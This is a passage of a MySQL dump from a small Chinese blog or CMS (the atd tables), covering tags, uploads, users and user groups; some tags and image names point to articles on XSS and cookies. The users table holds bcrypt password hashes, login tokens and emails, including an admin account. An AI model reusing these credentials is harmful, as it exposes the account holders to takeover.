  `name` varchar(80) NOT NULL,
  `count` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_tags`
--

INSERT INTO `atd_tags` (`tid`, `topic`, `name`, `count`) VALUES
(1, 0, 'C语言的标签', 0),
(2, 0, '安全', 4),
(3, 0, 'XSS', 5),
(4, 0, 'session fixation', 5);

-- --------------------------------------------------------

--
-- 表的结构 `atd_uploads`
--

CREATE TABLE `atd_uploads` (
  `rid` bigint(20) NOT NULL,
  `owner` bigint(20) NOT NULL,
  `name` varchar(80) NOT NULL,
  `time` int(11) NOT NULL,
  `resource` bigint(20) NOT NULL,
  `public` int(1) NOT NULL COMMENT '是否公开'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='上传资源表';

--
-- 转存表中的数据 `atd_uploads`
--

INSERT INTO `atd_uploads` (`rid`, `owner`, `name`, `time`, `resource`, `public`) VALUES
(34, 48, 'index.php', 1476201102, 1, 1),
(36, 43, 'favicon.ico', 1476201798, 3, 1),
(38, 43, '.htaccess', 1476202561, 5, 1),
(39, 43, 'avatar.svg', 1476262714, 8, 1),
(40, 43, 'mccn.gif', 1476263880, 9, 1),
(41, 43, 'user_anonymous.svg', 1476264445, 11, 1),
(42, 43, 'jxol.svg', 1476264471, 12, 1),
(43, 43, '15.jpg', 1476264539, 13, 1),
(44, 48, 'b1b84d8cca03cbbe903c5c41c8379798.jpg', 1476264801, 14, 1),
(45, 48, '03.jpg', 1476264861, 15, 1),
(46, 48, 'ATDColor.png', 1476264867, 16, 1),
(47, 48, 'logo2.1.png', 1476265793, 17, 1),
(48, 48, '100.png', 1476268017, 18, 1),
(49, 47, 'c2cec3fdfc03924585e5aeff8794a4c27c1e25e9.jpg', 1476429370, 19, 1),
(50, 0, 'login_by_cookie.png', 1476432608, 20, 1),
(51, 0, 'edit_with_markdown.png', 1476432608, 21, 1),
(52, 0, 'nothing.png', 1476432608, 22, 1),
(53, 0, 'my_script.png', 1476432608, 23, 1),
(54, 0, 'cookies.png', 1476432608, 24, 1),
(55, 0, 'xss_def.png', 1476432608, 25, 1),
(56, 0, 'cookie_with_js.png', 1476432608, 26, 1),
(57, 0, 'one_cookie.png', 1476432608, 27, 1),
(58, 0, 'one_cookie_get.png', 1476432608, 28, 1),
(59, 0, 'set_cookie.png', 1476432609, 29, 1),
(60, 0, 'a_girl.png', 1476432609, 30, 1),
(61, 0, 'chance_for_you.png', 1476432609, 31, 1),
(62, 0, 'baidu_jgylogo3.gif', 1476436563, 141, 1),
(63, 0, 'safe.zip', 1476437985, 308, 1);

-- --------------------------------------------------------

--
-- 表的结构 `atd_upload_resource`
--

CREATE TABLE `atd_upload_resource` (
  `rid` bigint(20) NOT NULL,
  `type` varchar(12) NOT NULL,
  `hash` varchar(32) NOT NULL,
  `reference` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_upload_resource`
--

INSERT INTO `atd_upload_resource` (`rid`, `type`, `hash`, `reference`) VALUES
(1, 'php', '227266af399578b7ab7e235c4cd8100d', 2),
(3, 'ico', 'd15c58b435dc1b1b305214dcf3db4fae', 4),
(5, 'htaccess', '234af24c938e881965fdd44c9992bf4b', 1),
(8, 'svg', 'cebf20154625a03f5f9d5affdb7cba44', 2),
(9, 'gif', '386e75a697a151ab862b15b833a32924', 1),
(11, 'svg', '1803ddd82bef96900ac786ea0ea9aa4d', 1),
(12, 'svg', 'adde1cc9e3fec089b92fb3d5e48c445e', 1),
(13, 'jpg', '080b9c6fd0b729fd46e48c807ceb9e80', 1),
(14, 'jpg', '94bfb9e39f398afac935295c961e9f50', 1),
(15, 'jpg', 'ee147f88e2412f55b62ab55077643bf2', 1),
(16, 'png', '8829c3201b2dc871517deb735f1a1cfa', 1),
(17, 'png', '6cf74c100bf8eb8b78bc7991ae83b862', 1),
(18, 'png', 'ff761cbfc7a765f282d245c4208922a8', 1),
(19, 'jpg', '8291c2a23be7df8509b078ef5198a27e', 1),
(20, 'png', '3a757192a5b09b29329bafb5f951fd9b', 92),
(21, 'png', 'd6aed4f09440caa77fa042be65fcefaa', 92),
(22, 'png', '91b52e3f0ba22ae45efc1fb211651fe9', 92),
(23, 'png', '64dbb9dff94f30f69f661f6d0d29f4ac', 92),
(24, 'png', 'cc1d137578dbf1634450cef7f071b599', 92),
(25, 'png', 'd181ff5e0e6ff39884c921e985a86ba2', 92),
(26, 'png', '33c03df2857a78ca3678a3fa76136da3', 92),
(27, 'png', '15db4a6aa7515b6744adc99dad80ac4b', 92),
(28, 'png', '15a4d0b3d96031cc6dd027d5f9ba2640', 92),
(29, 'png', 'dfc53b916f5e8bc52170631bb6d6cebf', 92),
(30, 'png', 'c2e4e14f6b34b26fe155b1248b5a6b22', 92),
(31, 'png', '177ece4458907cdbd82e61f613c14e0a', 92),
(141, 'gif', '803bb46a6acef395ed9353de2dcf26f5', 81),
(308, 'zip', '1739fba963b40d7fda8ff3a906c20c03', 70);

-- --------------------------------------------------------

--
-- 表的结构 `atd_users`
--

CREATE TABLE `atd_users` (
  `uid` bigint(20) NOT NULL,
  `uname` varchar(12) NOT NULL,
  `upass` varchar(60) NOT NULL,
  `gid` int(11) NOT NULL DEFAULT '2',
  `signup` int(11) NOT NULL,
  `signin` int(11) NOT NULL,
  `email` varchar(50) NOT NULL,
  `email_verify` enum('Y','N') NOT NULL DEFAULT 'N',
  `lastip` varchar(32) NOT NULL,
  `token` varchar(32) NOT NULL COMMENT '登陆验证值',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '状态'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_users`
--

INSERT INTO `atd_users` (`uid`, `uname`, `upass`, `gid`, `signup`, `signin`, `email`, `email_verify`, `lastip`, `token`, `status`) VALUES
(47, 'dddd', '$2y$10$wBPNnCrRl9272PSeMZyjOOo5x81XAB/RmOk9neWb7V1xd7Pz/bfBu', 2, 1475723206, 1476354661, 'dddd@q.c', 'N', '127.0.0.1', '02877731929056d02aa1ae58dea379be', 0),
(46, 'ddddd', '$2y$10$GvYQQAlFjC175csViVoS9eGkZ9JdxTTrDdnTZ6DzPQkxQB8K5.RR6', 2, 1475722991, 0, 'd@d.c', 'N', '127.0.0.1', 'ef9ec8193f2a12635b81dabec5aa5edc', 0),
(44, 'admin', '$2y$10$e0R6lH7pS2Og6DhRqpcaZ.ex.5WWZM0yGieCg/Y9CJT4pJMNCRAcW', 2, 1475669954, 0, 'admin@atd3.cn', 'N', '127.0.0.1', '4f992374c5dc8e7ec07e514539f47ea3', 0),
(48, 'dxkite', '$2y$10$YWbzIa.kyMGGHjLW5M1RAulf3dp8g3QVIVS.F8MS9rylHyBeaBgkq', 1, 1475722991, 1476343793, 'dxkite@atd3.cn', 'N', '127.0.0.1', '', 0),
(43, 'hello', '$2y$10$Ld4pc3sUM3lT4fr1UPwQt.VlTcQkBA0kB/1eHdH.1ReDiFwjwO9bu', 2, 1475652025, 1476201732, 'helloworld@atd3.cn', 'Y', '127.0.0.1', '', 0);

-- --------------------------------------------------------

--
-- 表的结构 `atd_user_group`
--

CREATE TABLE `atd_user_group` (
  `uid` bigint(20) NOT NULL,
  `gid` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `atd_user_group`
--

INSERT INTO `atd_user_group` (`uid`, `gid`) VALUES
(48, 1),
(48, 2);

-- --------------------------------------------------------

--
-- 表的结构 `atd_user_info`
--

CREATE TABLE `atd_user_info` (
  `uid` bigint(20) NOT NULL,
  `avatar` bigint(20) NOT NULL COMMENT '头像文件ID',
  `qq` varchar(20) DEFAULT NULL,
  `discription` tinytext NOT NULL,
  `phone` varchar(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户信息';

--
-- 转存表中的数据 `atd_user_info`
--

INSERT INTO `atd_user_info` (`uid`, `avatar`, `qq`, `discription`, `phone`) VALUES
(43, 43, NULL, '学无领域，一学到底。', NULL),
(47, 49, NULL, 'hhahhahh', NULL),
(48, 48, NULL, '学无领域，一学到底。', NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `atd_articles`
--
ALTER TABLE `atd_articles`
  ADD PRIMARY KEY (`aid`),
  ADD UNIQUE KEY `filemd5` (`hash`),
  ADD KEY `topic` (`topic`),
  ADD KEY `keep_top` (`keep_top`),
  ADD KEY `public` (`public`),
  ADD KEY `allow_replay` (`allow_reply`),
  ADD KEY `verify` (`verify`),
  ADD KEY `modified` (`modified`),
  ADD KEY `modified_2` (`modified`),
  ADD KEY `category` (`category`);

--
-- Indexes for table `atd_bugs`
--
ALTER TABLE `atd_bugs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `atd_category`
--
ALTER TABLE `atd_category`
  ADD PRIMARY KEY (`cid`),
  ADD KEY `cname` (`name`),
  ADD KEY `parent` (`parent`);

--
-- Indexes for table `atd_groups`
--
ALTER TABLE `atd_groups`
  ADD PRIMARY KEY (`gid`),
  ADD KEY `gname` (`gname`),
  ADD KEY `priority` (`priority`);

--
-- Indexes for table `atd_nav`
--
ALTER TABLE `atd_nav`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`),
  ADD KEY `parent` (`parent`);

--
-- Indexes for table `atd_signin_historys`
--
ALTER TABLE `atd_signin_historys`
  ADD PRIMARY KEY (`hid`),
  ADD KEY `uid` (`uid`);

--
-- Indexes for table `atd_site_options`
--
ALTER TABLE `atd_site_options`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `name_2` (`name`),
  ADD KEY `name` (`name`);

--
-- Indexes for table `atd_tags`
--
ALTER TABLE `atd_tags`
  ADD PRIMARY KEY (`tid`),
  ADD UNIQUE KEY `name` (`name`),
  ADD KEY `topic` (`topic`);

--
-- Indexes for table `atd_uploads`
--
ALTER TABLE `atd_uploads`
  ADD PRIMARY KEY (`rid`),
  ADD KEY `owner` (`owner`),
  ADD KEY `public` (`public`),
  ADD KEY `resource` (`resource`);

--
-- Indexes for table `atd_upload_resource`
--
ALTER TABLE `atd_upload_resource`
  ADD PRIMARY KEY (`rid`),
  ADD UNIQUE KEY `hash` (`hash`),
  ADD KEY `type` (`type`);

--
-- Indexes for table `atd_users`
--
ALTER TABLE `atd_users`
  ADD PRIMARY KEY (`uid`),
  ADD UNIQUE KEY `uid` (`uid`),
  ADD UNIQUE KEY `uname` (`uname`),
  ADD KEY `uid_2` (`uid`),
  ADD KEY `uid_3` (`uid`),
  ADD KEY `uid_4` (`uid`);

--
-- Indexes for table `atd_user_group`
--
ALTER TABLE `atd_user_group`
  ADD KEY `uid` (`uid`),
  ADD KEY `gid` (`gid`),
  ADD KEY `uid_2` (`uid`),
  ADD KEY `gid_2` (`gid`);

--
-- Indexes for table `atd_user_info`
--
ALTER TABLE `atd_user_info`
  ADD PRIMARY KEY (`uid`),
  ADD KEY `avatar` (`avatar`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `atd_articles`
--
ALTER TABLE `atd_articles`
  MODIFY `aid` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'ID', AUTO_INCREMENT=50;
--
-- 使用表AUTO_INCREMENT `atd_bugs`
--
ALTER TABLE `atd_bugs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- 使用表AUTO_INCREMENT `atd_category`
--
ALTER TABLE `atd_category`
  MODIFY `cid` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '分类', AUTO_INCREMENT=2;
--
-- 使用表AUTO_INCREMENT `atd_groups`
--
ALTER TABLE `atd_groups`
  MODIFY `gid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- 使用表AUTO_INCREMENT `atd_nav`
--
ALTER TABLE `atd_nav`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- 使用表AUTO_INCREMENT `atd_signin_historys`
--
ALTER TABLE `atd_signin_historys`
  MODIFY `hid` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=59;
--
-- 使用表AUTO_INCREMENT `atd_site_options`
--
ALTER TABLE `atd_site_options`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;
--
-- 使用表AUTO_INCREMENT `atd_tags`
--
ALTER TABLE `atd_tags`
  MODIFY `tid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- 使用表AUTO_INCREMENT `atd_uploads`
--
ALTER TABLE `atd_uploads`
  MODIFY `rid` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=64;
--
-- 使用表AUTO_INCREMENT `atd_upload_resource`
--
ALTER TABLE `atd_upload_resource`
  MODIFY `rid` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1275;
--
-- 使用表AUTO_INCREMENT `atd_users`
--
ALTER TABLE `atd_users`
  MODIFY `uid` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=49;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
